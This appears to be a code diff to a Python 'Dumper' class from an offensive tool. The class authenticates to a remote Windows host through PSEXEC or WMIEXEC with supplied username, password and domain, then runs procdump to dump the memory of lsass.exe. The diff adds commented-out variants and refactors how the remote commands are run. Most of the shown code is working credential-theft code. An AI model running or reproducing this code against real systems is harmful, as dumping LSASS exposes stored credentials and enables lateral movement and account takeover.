@@ -108,6 +108,41 @@ class Dumper:
     def exec_procdump(self):
         print("Executing procdump")
         if self.auth == "psexec":
+            # if self.host_info["arch"] == 64:
+            #     executer = PSEXEC(
+            #         "C:\\procdump.exe -accepteula C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+            #         None,
+            #         None,
+            #         None,
+            #         int(445),
+            #         self.credentials["username"],
+            #         self.credentials["password"],
+            #         self.credentials["domain"],
+            #         None,
+            #         None,
+            #         False,
+            #         None,
+            #         "",
+            #     )
+            # else:
+            #     executer = PSEXEC(
+            #         "C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
+            #         None,
+            #         None,
+            #         None,
+            #         int(445),
+            #         self.credentials["username"],
+            #         self.credentials["password"],
+            #         self.credentials["domain"],
+            #         None,
+            #         None,
+            #         False,
+            #         None,
+            #         "",
+            #     )
+            # executer.run(
+            #     remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
+            # )
             executer = PSEXEC(
                 "C:\\procdump.exe -accepteula",
                 None,
@@ -122,10 +157,7 @@ class Dumper:
                 False,
                 None,
                 "",
-            )
-            executer.run(
-                remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
-            )
+            ).run(self.target, self.target)
             if self.host_info["arch"] == 64:
                 executer = PSEXEC(
                     f"C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
@@ -158,10 +190,35 @@ class Dumper:
                     None,
                     "",
                 )
-            executer.run(
-                remoteName=self.host_info["target"], remoteHost=self.host_info["target"]
-            )
+            executer.run(remoteName=self.target, remoteHost=self.target)
         elif self.auth == "wmiexec":
+            #     if self.host_info["arch"] == 64:
+            #         executer = WMIEXEC(
+            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
+            #             username=self.credentials["username"],
+            #             password=self.credentials["password"],
+            #             domain=self.credentials["domain"],
+            #             hashes=None,
+            #             aesKey=None,
+            #             share="C$",
+            #             noOutput=False,
+            #             doKerberos=False,
+            #             kdcHost=None,
+            #         )
+            #     else:
+            #         executer = WMIEXEC(
+            #             command="C:\\procdump.exe -accepteula && C:\\procdump.exe -ma lsass.exe C:\\lsass_dump",
+            #             username=self.credentials["username"],
+            #             password=self.credentials["password"],
+            #             domain=self.credentials["domain"],
+            #             hashes=None,
+            #             aesKey=None,
+            #             share="C$",
+            #             noOutput=False,
+            #             doKerberos=False,
+            #             kdcHost=None,
+            #         )
+            #     executer.run(self.host_info["target"])
             executer = WMIEXEC(
                 command="C:\\procdump.exe -accepteula",
                 username=self.credentials["username"],
@@ -173,8 +230,7 @@ class Dumper:
                 noOutput=False,
                 doKerberos=False,
                 kdcHost=None,
-            )
-            executer.run(self.host_info["target"])
+            ).run(self.target)
             if self.host_info["arch"] == 64:
                 executer = WMIEXEC(
                     command="C:\\procdump.exe -ma -64 lsass.exe C:\\lsass_dump",
@@ -201,7 +257,7 @@ class Dumper:
                     doKerberos=False,
                     kdcHost=None,
                 )
-            executer.run(self.host_info["target"])
+            executer.run(self.target)
         print("Done")
 
     def dump_lsass(self):
